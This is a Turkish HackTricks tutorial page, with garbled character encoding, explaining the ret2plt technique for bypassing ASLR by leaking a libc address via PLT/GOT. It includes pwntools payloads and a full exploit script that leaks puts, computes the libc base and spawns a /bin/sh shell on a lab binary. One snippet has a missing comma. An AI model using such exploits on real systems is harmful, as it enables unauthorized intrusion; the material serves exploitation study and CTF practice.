# Ret2plt

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

Bu teknikteki amaÃ§, **PLT'den bir iÅŸlevin adresini sÄ±zdÄ±rmak** ve ASLR'yi atlamak iÃ§in kullanmaktÄ±r. Bu, Ã¶rneÄŸin, libc'ten `puts` iÅŸlevinin adresini sÄ±zdÄ±rÄ±rsanÄ±z, ardÄ±ndan **`libc`'nin tabanÄ±nÄ± hesaplayabilir** ve diÄŸer iÅŸlevlere eriÅŸmek iÃ§in **`system`** gibi iÅŸlevlere eriÅŸmek iÃ§in ofsetleri hesaplayabilirsiniz.

Bu, `pwntools` yÃ¼kÃ¼yle ÅŸu ÅŸekilde yapÄ±labilir ([**buradan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
**`puts`** (PLT adresinden kullanÄ±larak) `GOT` iÃ§inde bulunan `puts` adresi ile Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± unutmayÄ±n. Bu, `puts` `GOT` girdisini yazdÄ±rdÄ±ÄŸÄ±nda, bu giriÅŸin bellekteki `puts` adresini iÃ§ereceÄŸi anlamÄ±na gelir.

AyrÄ±ca, sÃ¶mÃ¼rÃ¼de `main` adresinin nasÄ±l kullanÄ±ldÄ±ÄŸÄ±na dikkat edin, bÃ¶ylece `puts` iÅŸlemini bitirdiÄŸinde, **binary Ã§Ä±kÄ±ÅŸ yapmak yerine tekrar `main`i Ã§aÄŸÄ±rÄ±r** (bu nedenle sÄ±zdÄ±rÄ±lan adres geÃ§erli olmaya devam eder).

{% hint style="danger" %}
Bu iÅŸin Ã§alÄ±ÅŸmasÄ± iÃ§in binary'nin **PIE ile derlenmemiÅŸ olmasÄ±** veya `PLT`, `GOT` ve `main` adreslerini bilmek iÃ§in **PIE'yi atlamak iÃ§in bir sÄ±zÄ±ntÄ± bulmuÅŸ olmanÄ±z** gerektiÄŸini unutmayÄ±n.
{% endhint %}

Bu atlamayÄ± [**burada tam bir Ã¶rnekte bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Bu, Ã¶rneÄŸin son saldÄ±rÄ±sÄ±ydÄ±:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## DiÄŸer Ã¶rnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE olmayan, ilk adÄ±m canary'nin 0x00 byte'Ä±na kadar taÅŸmasÄ±yla doldurulmasÄ± ve ardÄ±ndan puts'u Ã§aÄŸÄ±rarak sÄ±zdÄ±rmaktÄ±r. Canary ile puts'un GOT'tan adresini sÄ±zdÄ±rmak iÃ§in bir ROP cihazÄ± oluÅŸturulur ve ardÄ±ndan `system('/bin/sh')` Ã§aÄŸÄ±rmak iÃ§in bir ROP cihazÄ±.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary olmayan, ana fonksiyondan bir alt fonksiyonda stack taÅŸmasÄ±. Puts'u Ã§aÄŸÄ±rmak iÃ§in ROP cihazÄ± kullanarak puts'un GOT'tan adresini sÄ±zdÄ±rmak ve ardÄ±ndan bir one gadget Ã§aÄŸÄ±rmak.

<details>

<summary><strong>SÄ±fÄ±rdan baÅŸlayarak AWS hacklemeyi htARTE (HackTricks AWS Red Team Expert) ile Ã¶ÄŸrenin</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
